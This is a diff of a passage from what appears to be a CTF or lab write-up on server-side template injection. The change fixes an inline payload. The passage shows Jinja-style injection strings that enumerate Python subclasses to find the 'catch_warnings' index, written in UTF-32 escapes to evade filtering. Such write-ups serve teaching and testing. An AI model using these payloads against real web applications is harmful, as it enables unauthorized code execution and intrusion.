@@ -196,7 +196,7 @@ Connection: close
 
 ## finding `catch_warnings` index
 
-by sending `{{''['__class__']['__mro__'][1]['__subclasses__']` in UTF-32 like the following,
+by sending ` {{''['__class__']['__mro__'][1]['__subclasses__']}} ` in UTF-32 like the following,
 
 ```bash
 {{''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()}}
